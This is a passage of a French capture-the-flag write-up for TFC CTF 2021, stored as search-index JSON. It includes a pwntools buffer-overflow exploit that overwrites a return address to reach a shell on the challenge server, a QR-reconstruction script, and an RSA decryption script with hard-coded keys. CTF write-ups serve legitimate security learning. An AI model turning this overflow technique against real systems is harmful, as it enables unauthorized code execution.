* sh = remote(\"server.challenge.ctf.thefewchosen.com\",1340) #sh = process(\"./santa\") payload = b\"A\"*(0x38) + p64(0x00401016) + p64(0x00401152) print(sh.recv().decode()) sh.sendline(payload) print(sh.interactive()) ","date":"2021-12-23","objectID":"/fr/tfcctf2021-writeup/:3:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/fr/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Weid friend [Misc] Pièce jointe:here J’ai utilisé: strong-qr-decoder c = open(\"weird_friend.txt\").read().strip() flag,out = ('','') for i in c: flag += i if len(flag) == 29: out += flag+\"\\n\" flag=\"\" open(\"qr.txt\",\"w\").write(out) Result: ","date":"2021-12-23","objectID":"/fr/tfcctf2021-writeup/:4:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/fr/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Am i doing it right? [Crypto] Pièce jointe::here Tout d’abord, je voulais utiliser RSACTFTOOL pour trouver D mais cela n’a pas fonctionné. Je récupère donc le N et le E avec RSACTFTOOL. J’ai utilisé quelques outils pour récupérer les p, q et d mais ça ne marche pas jusqu’à ce que j’essaye RSa-Cipher sur Dcode Et bingo, j’ai le p, le q et le d. J’ai donc écrit un script Python pour déchiffrer le fichier chall.enc from Crypto.Util.number import long_to_bytes,bytes_to_long c = open(\"chall.enc\",\"rb\").read() c = bytes_to_long(c) n = 17729028558979019485846420034614601781855286885772116033115998289130663218793249135103097941406615594783564487056148202535602218241261076180277862184340050681277512936764254998557657989633659561175844653871375735119626199870178796372816549333367076487655787617921785826120525919291798195591267544750350222858119219959311035913906885739352404726672836723117136379411134589884489391116922923390687958161705756705708668649262568471831705504852664779788943978721769038284989250803324876493071615384204553854811020877754034576798208169454695001947778015807032019651748938505463608871771494765303144219873993106068807291321 e = 65537 d = 3500250248327349941672136790330322298173940781772211260089535710561387481696840724462501857940708289682233561164220235784490548878094466708830359320737536288891004163888989356033042963942046798938832323366063912548832619743354798758989171488234685790832327326369684099122228433857463369589017055427083655546629869448560863558252541573729181294198925126252806108158471450212498376272391643662951937867203907881541852521739527440641096867158947718038717211827677824862115138300242300421747601306316869658769565879739394458142873158790249493313154357342610957929927393333582078957693189916431285660748179207993771566093 m = pow(c,d,n) print(long_to_bytes(m)) Result: ","date":"2021-12-23","objectID":"/fr/tfcctf2021-writeup/:5:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/fr/tfcctf2021-writeup/"}]